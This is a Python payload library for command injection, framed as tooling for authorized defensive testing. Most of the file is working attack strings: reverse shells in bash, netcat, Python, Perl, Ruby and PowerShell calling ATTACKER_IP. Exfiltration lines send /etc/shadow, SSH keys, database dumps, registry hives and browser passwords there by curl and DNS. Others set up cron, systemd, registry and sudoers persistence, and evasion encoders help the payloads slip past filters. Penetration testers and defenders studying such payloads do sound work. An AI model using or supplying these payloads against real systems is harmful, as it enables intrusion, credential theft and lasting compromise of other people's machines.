#!/usr/bin/env python3
"""
Advanced Command Injection Payloads - High Level Real Exploitation
Comprehensive command injection payloads for defensive security testing

⚠️  FOR AUTHORIZED DEFENSIVE TESTING ONLY ⚠️
These are REAL command injection payloads used in actual penetration testing
Risk Level: 5-7 (High to Critical Impact)
Complexity Level: 6-8 (Expert to Master Level)
"""

from typing import Dict, List, Any, Tuple
import base64
import urllib.parse
import random

class CommandInjectionPayloads:
    """Advanced command injection payload generator"""
    
    def __init__(self):
        self.linux_payloads = self._load_linux_payloads()
        self.windows_payloads = self._load_windows_payloads()
        self.blind_payloads = self._load_blind_payloads()
        self.time_based_payloads = self._load_time_based_payloads()
        self.evasion_techniques = self._load_evasion_techniques()
    
    def _load_linux_payloads(self) -> Dict[str, List[str]]:
        """Real Linux command injection payloads"""
        return {
            "basic_execution": [
                # Direct command execution
                "; whoami",
                "| whoami",
                "|| whoami",
                "&& whoami",
                "& whoami",
                "`whoami`",
                "$(whoami)",
                "${whoami}",
                
                # System information gathering
                "; uname -a",
                "| cat /etc/passwd",
                "|| cat /etc/shadow",
                "&& cat /proc/version",
                "; cat /etc/hosts",
                "| ps aux",
                "|| netstat -tulpn",
                "&& cat /proc/meminfo",
                
                # Network enumeration
                "; ifconfig",
                "| ip addr show",
                "|| ss -tulpn",
                "&& cat /etc/resolv.conf",
                "; arp -a",
                "| route -n",
                "|| cat /proc/net/tcp",
                "&& lsof -i",
            ],
            
            "reverse_shells": [
                # Bash reverse shells
                "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                "| bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",
                "&& /bin/bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5|while read line;do $line 2>&5 >&5;done'",
                
                # Netcat reverse shells
                "; nc -e /bin/bash ATTACKER_IP 4444",
                "| nc.traditional -e /bin/bash ATTACKER_IP 4444",
                "&& rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f",
                
                # Python reverse shells
                "; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
                "| python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
                
                # Perl reverse shells
                "&& perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                
                # Ruby reverse shells
                "; ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER_IP\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            ],
            
            "data_exfiltration": [
                # File reading and exfiltration
                "; cat /etc/passwd | curl -X POST -d @- http://ATTACKER_IP:8000/",
                "| base64 /etc/shadow | curl -X POST -d @- http://ATTACKER_IP:8000/shadow",
                "&& tar czf - /var/www/ | curl -X POST --data-binary @- http://ATTACKER_IP:8000/www.tar.gz",
                "; find / -name \"*.conf\" -exec cat {} \\; | curl -X POST -d @- http://ATTACKER_IP:8000/configs",
                "| grep -r \"password\" /var/log/ | curl -X POST -d @- http://ATTACKER_IP:8000/passwords",
                
                # Database dumping
                "&& mysqldump --all-databases | curl -X POST -d @- http://ATTACKER_IP:8000/mysql.sql",
                "; pg_dumpall | curl -X POST -d @- http://ATTACKER_IP:8000/postgres.sql",
                
                # SSH key theft
                "| cat ~/.ssh/id_rsa | curl -X POST -d @- http://ATTACKER_IP:8000/ssh_key",
                "&& find /home -name \"id_rsa\" -exec cat {} \\; | curl -X POST -d @- http://ATTACKER_IP:8000/all_ssh_keys",
            ],
            
            "persistence": [
                # Cron-based persistence
                "; (crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.persist >/dev/null 2>&1') | crontab -",
                "| echo '*/10 * * * * curl http://ATTACKER_IP/shell.sh | bash' | crontab -",
                
                # SSH key persistence
                "&& mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...' >> ~/.ssh/authorized_keys",
                "; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...' > /root/.ssh/authorized_keys",
                
                # Service persistence
                "| echo '[Unit]\nDescription=System Update\n[Service]\nExecStart=/tmp/.persist\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/update.service && systemctl enable update",
                
                # Bashrc persistence
                "&& echo 'nohup /tmp/.persist &' >> ~/.bashrc",
                "; echo '(/tmp/.persist &)' >> /etc/bash.bashrc",
            ],
            
            "privilege_escalation": [
                # SUID exploitation
                "; find / -perm -4000 2>/dev/null",
                "| find / -user root -perm -4000 -exec ls -ldb {} \\;",
                
                # Sudo exploitation
                "&& sudo -l",
                "; echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
                
                # Kernel exploits
                "| uname -r && cat /etc/issue",
                "&& gcc -o /tmp/exploit exploit.c && /tmp/exploit",
                
                # Capabilities exploitation
                "; getcap -r / 2>/dev/null",
                "| /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            ]
        }
    
    def _load_windows_payloads(self) -> Dict[str, List[str]]:
        """Real Windows command injection payloads"""
        return {
            "basic_execution": [
                # Direct command execution
                "& whoami",
                "| whoami",
                "|| whoami",
                "&& whoami",
                "; whoami",
                
                # System information
                "& systeminfo",
                "| net user",
                "&& ipconfig /all",
                "; netstat -ano",
                "| tasklist",
                "&& wmic os get name,version,buildnumber",
                "; wmic computersystem get name,domain,workgroup",
                "| net localgroup administrators",
                
                # Network enumeration
                "&& arp -a",
                "; route print",
                "| nslookup",
                "&& netsh wlan show profiles",
            ],
            
            "reverse_shells": [
                # PowerShell reverse shells
                "& powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
                
                # Base64 encoded PowerShell
                "| powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAQQBUAFQAQQBDAEsARQBSAF8ASQBQACIALAA0ADQANAA0ACkA",
                
                # Netcat for Windows
                "&& nc.exe -e cmd.exe ATTACKER_IP 4444",
                "; ncat.exe -e cmd.exe ATTACKER_IP 4444",
                
                # MSBuild reverse shell
                "| MSBuild.exe C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe shell.xml",
            ],
            
            "data_exfiltration": [
                # File exfiltration
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts | curl -X POST -d @- http://ATTACKER_IP:8000/",
                "| powershell -Command \"Get-Content C:\\Users\\*\\Desktop\\*.txt | Out-String | Invoke-WebRequest -Uri 'http://ATTACKER_IP:8000' -Method POST -Body $_\"",
                "&& dir /s /b C:\\Users\\*.txt | findstr /i password > temp.txt && curl -X POST -T temp.txt http://ATTACKER_IP:8000/passwords.txt",
                
                # Registry dumping
                "; reg save HKLM\\SAM C:\\temp\\sam.hive && curl -X POST -T C:\\temp\\sam.hive http://ATTACKER_IP:8000/sam",
                "| reg save HKLM\\SYSTEM C:\\temp\\system.hive && curl -X POST -T C:\\temp\\system.hive http://ATTACKER_IP:8000/system",
                
                # Browser data theft
                "&& copy \"C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\temp\\ && curl -X POST -T \"C:\\temp\\Login Data\" http://ATTACKER_IP:8000/chrome_passwords",
            ],
            
            "persistence": [
                # Registry persistence
                "& reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\Windows\\Temp\\persist.exe\" /f",
                "| reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityUpdate\" /t REG_SZ /d \"powershell.exe -WindowStyle Hidden -File C:\\Windows\\Temp\\persist.ps1\" /f",
                
                # Scheduled task persistence
                "&& schtasks /create /tn \"SystemUpdate\" /tr \"C:\\Windows\\Temp\\persist.exe\" /sc minute /mo 5",
                "; schtasks /create /tn \"WindowsUpdate\" /tr \"powershell.exe -WindowStyle Hidden -File C:\\Windows\\Temp\\persist.ps1\" /sc onstart /ru SYSTEM",
                
                # Service persistence
                "| sc create \"SecurityService\" binpath= \"C:\\Windows\\Temp\\persist.exe\" start= auto",
                "&& powershell -Command \"New-Service -Name 'WindowsSecurityUpdate' -BinaryPathName 'C:\\Windows\\Temp\\persist.exe' -StartupType Automatic\"",
            ],
            
            "privilege_escalation": [
                # Token manipulation
                "& whoami /priv",
                "| whoami /groups",
                
                # UAC bypass
                "&& powershell -Command \"Start-Process cmd -ArgumentList '/c whoami > C:\\temp\\privs.txt' -Verb RunAs\"",
                
                # Windows exploit checks
                "; systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
                "| wmic qfe list",
                "&& powershell -Command \"Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object -Property HotFixID\"",
            ]
        }
    
    def _load_blind_payloads(self) -> Dict[str, List[str]]:
        """Blind command injection payloads for detection"""
        return {
            "dns_exfiltration": [
                # DNS-based data exfiltration
                "; nslookup $(whoami).ATTACKER_DOMAIN",
                "| dig $(hostname).ATTACKER_DOMAIN",
                "&& host $(id).ATTACKER_DOMAIN",
                "; ping -c1 $(whoami | tr ' ' '-').ATTACKER_DOMAIN",
                "| curl http://$(whoami).ATTACKER_DOMAIN",
                
                # Windows DNS exfiltration
                "& nslookup %USERNAME%.ATTACKER_DOMAIN",
                "| ping -n 1 %COMPUTERNAME%.ATTACKER_DOMAIN",
                "&& powershell -Command \"Resolve-DnsName ($env:USERNAME + '.ATTACKER_DOMAIN')\"",
            ],
            
            "http_exfiltration": [
                # HTTP-based blind detection
                "; curl http://ATTACKER_IP:8000/$(whoami)",
                "| wget http://ATTACKER_IP:8000/$(hostname)",
                "&& python3 -c 'import urllib.request; urllib.request.urlopen(\"http://ATTACKER_IP:8000/\" + open(\"/etc/hostname\").read().strip())'",
                
                # Windows HTTP exfiltration
                "& powershell -Command \"Invoke-WebRequest -Uri ('http://ATTACKER_IP:8000/' + $env:USERNAME)\"",
                "| certutil -urlcache -split -f http://ATTACKER_IP:8000/%USERNAME%",
            ],
            
            "file_based": [
                # File-based indicators
                "; touch /tmp/command_injection_test_$(date +%s)",
                "| echo 'Command injection successful' > /tmp/ci_test.txt",
                "&& whoami > /var/www/html/test_$(date +%s).txt",
                
                # Windows file indicators
                "& echo Command injection successful > C:\\temp\\ci_test.txt",
                "| type nul > C:\\Windows\\Temp\\test_%RANDOM%.txt",
                "&& powershell -Command \"'Injection successful' | Out-File -FilePath 'C:\\temp\\test.txt'\"",
            ]
        }
    
    def _load_time_based_payloads(self) -> Dict[str, List[str]]:
        """Time-based blind command injection payloads"""
        return {
            "linux_delays": [
                "; sleep 5",
                "| sleep 10",
                "&& sleep 15",
                "; ping -c 5 127.0.0.1",
                "| timeout 10 sleep 10",
                "&& bash -c 'sleep 7'",
                "; python3 -c 'import time; time.sleep(8)'",
                "| perl -e 'sleep(6)'",
            ],
            
            "windows_delays": [
                "& timeout 5",
                "| ping -n 6 127.0.0.1",
                "&& powershell -Command \"Start-Sleep -Seconds 7\"",
                "; waitfor /t 8 pause",
                "| choice /c y /n /d y /t 9",
                "&& powershell -Command \"[System.Threading.Thread]::Sleep(10000)\"",
            ]
        }
    
    def _load_evasion_techniques(self) -> Dict[str, Any]:
        """Advanced evasion techniques for bypassing filters"""
        return {
            "encoding": {
                "hex": lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
                "base64": lambda x: base64.b64encode(x.encode()).decode(),
                "url": lambda x: urllib.parse.quote(x),
                "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
                "unicode": lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            },
            
            "obfuscation": {
                "variable_expansion": ["${IFS}", "$9", "${PATH:0:1}", "$@"],
                "concatenation": ["'w'hoami", "wh'o'ami", "who'a'mi", "who\"a\"mi"],
                "wildcards": ["who?mi", "w*ami", "who[a]mi", "/bin/[s]h"],
                "case_variation": ["WhOaMi", "wHoAmI", "WHOAMI"],
            },
            
            "bypass_techniques": {
                "comment_insertion": ["who#comment\nami", "who/*comment*/ami"],
                "newline_injection": ["who\nami", "who\r\nami", "who\x0aami"],
                "tab_injection": ["who\tami", "who\x09ami"],
                "null_byte": ["whoami\x00", "whoami%00"],
                "backtick_substitution": ["`whoami`", "`wh``oami`"],
            }
        }
    
    def get_payloads_by_category(self, os_type: str = "linux", category: str = "basic_execution") -> List[str]:
        """Get payloads by operating system and category"""
        if os_type.lower() == "linux":
            return self.linux_payloads.get(category, [])
        elif os_type.lower() == "windows":
            return self.windows_payloads.get(category, [])
        else:
            return []
    
    def get_blind_payloads(self, technique: str = "dns_exfiltration") -> List[str]:
        """Get blind command injection payloads"""
        return self.blind_payloads.get(technique, [])
    
    def get_time_based_payloads(self, os_type: str = "linux") -> List[str]:
        """Get time-based payloads for blind detection"""
        key = f"{os_type.lower()}_delays"
        return self.time_based_payloads.get(key, [])
    
    def apply_evasion(self, payload: str, technique_type: str = "encoding", 
                     technique: str = "base64") -> str:
        """Apply evasion technique to payload"""
        if technique_type in self.evasion_techniques:
            techniques = self.evasion_techniques[technique_type]
            if technique in techniques:
                if callable(techniques[technique]):
                    return techniques[technique](payload)
                elif isinstance(techniques[technique], list):
                    return random.choice(techniques[technique])
        return payload
    
    def generate_custom_payload(self, command: str, os_type: str = "linux", 
                              separator: str = ";", evasion: bool = False) -> str:
        """Generate custom command injection payload"""
        payload = f"{separator} {command}"
        
        if evasion:
            # Apply random evasion technique
            technique_types = list(self.evasion_techniques.keys())
            tech_type = random.choice(technique_types)
            techniques = list(self.evasion_techniques[tech_type].keys())
            tech = random.choice(techniques)
            payload = self.apply_evasion(payload, tech_type, tech)
        
        return payload
    
    def get_comprehensive_test_set(self, os_type: str = "linux") -> List[Dict[str, Any]]:
        """Get comprehensive command injection test set"""
        test_set = []
        
        if os_type.lower() == "linux":
            payloads_dict = self.linux_payloads
        else:
            payloads_dict = self.windows_payloads
        
        for category, payloads in payloads_dict.items():
            for payload in payloads:
                test_set.append({
                    'payload': payload,
                    'category': category,
                    'os_type': os_type,
                    'risk_level': self._assess_risk_level(category, payload),
                    'detection_difficulty': self._assess_detection_difficulty(payload)
                })
        
        return test_set
    
    def _assess_risk_level(self, category: str, payload: str) -> str:
        """Assess risk level of payload"""
        high_risk_categories = ['reverse_shells', 'persistence', 'privilege_escalation']
        high_risk_commands = ['rm -rf', 'format', 'del /f', 'shutdown', 'reboot']
        
        if category in high_risk_categories:
            return "HIGH"
        elif any(cmd in payload.lower() for cmd in high_risk_commands):
            return "CRITICAL"
        elif 'data_exfiltration' in category:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _assess_detection_difficulty(self, payload: str) -> str:
        """Assess how difficult the payload is to detect"""
        if any(char in payload for char in ['\\x', '\\u', 'base64']):
            return "HARD"
        elif any(char in payload for char in ['`', '$', '{', '}']):
            return "MEDIUM"
        else:
            return "EASY"

# Usage examples and payload statistics
if __name__ == "__main__":
    print("Advanced Command Injection Payloads - High Level Real Exploitation")
    print("=" * 70)
    
    ci_payloads = CommandInjectionPayloads()
    
    # Count payloads
    linux_total = sum(len(payloads) for payloads in ci_payloads.linux_payloads.values())
    windows_total = sum(len(payloads) for payloads in ci_payloads.windows_payloads.values())
    blind_total = sum(len(payloads) for payloads in ci_payloads.blind_payloads.values())
    time_total = sum(len(payloads) for payloads in ci_payloads.time_based_payloads.values())
    
    print(f"Linux Payloads: {linux_total}")
    print(f"Windows Payloads: {windows_total}")
    print(f"Blind Payloads: {blind_total}")
    print(f"Time-based Payloads: {time_total}")
    print(f"Total Command Injection Payloads: {linux_total + windows_total + blind_total + time_total}")
    
    print("\nLinux Categories:")
    for category, payloads in ci_payloads.linux_payloads.items():
        print(f"  - {category}: {len(payloads)} payloads")
    
    print("\nWindows Categories:")
    for category, payloads in ci_payloads.windows_payloads.items():
        print(f"  - {category}: {len(payloads)} payloads")
    
    print("\nEvasion Techniques Available:")
    for technique_type, techniques in ci_payloads.evasion_techniques.items():
        print(f"  - {technique_type}: {len(techniques)} methods")